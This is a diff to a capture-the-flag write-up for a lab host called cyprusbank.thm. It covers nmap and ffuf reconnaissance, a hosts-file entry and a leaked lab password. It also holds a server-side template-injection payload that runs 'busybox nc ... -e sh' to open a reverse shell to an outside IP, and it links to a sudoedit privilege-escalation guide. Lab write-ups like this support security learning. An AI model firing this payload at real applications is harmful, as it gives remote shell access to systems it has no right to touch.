@@ -2,6 +2,8 @@
 
 ## Recon
 
+I started running nmap and I got the result:
+
 ```
 $ nmap -sV -sC 10.66.128.105 
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-14 05:17 -0500
@@ -22,6 +24,12 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 13.40 seconds
 ```
+
+I tried to find some files and directories in `cyprusbank.thm` but I didn't find anything interesting. 
+
+<figure><img src="internal-1.png" alt=""><figcaption></figcaption></figure>
+
+After that I tried to find subdomains.
 
 ```
 $ ffuf -u http://cyprusbank.thm -H "Host: FUZZ.cyprusbank.thm" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -mc all -fs 57
@@ -56,6 +64,9 @@ www                     [Status: 200, Size: 252, Words: 19, Lines: 9, Duration: 
 ```
 
 
+
+## Exploiting
+
 ```
 10.66.128.105   cyprusbank.thm  admin.cyprusbank.thm
 ```
@@ -68,3 +79,5 @@ Gayle Bev: 'p~]P@5!6;rs558:q'
 ```
 name=test&password=123&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 192.168.130.101 1337 -e sh');s
 ```
+
+https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudoedit-privilege-escalation
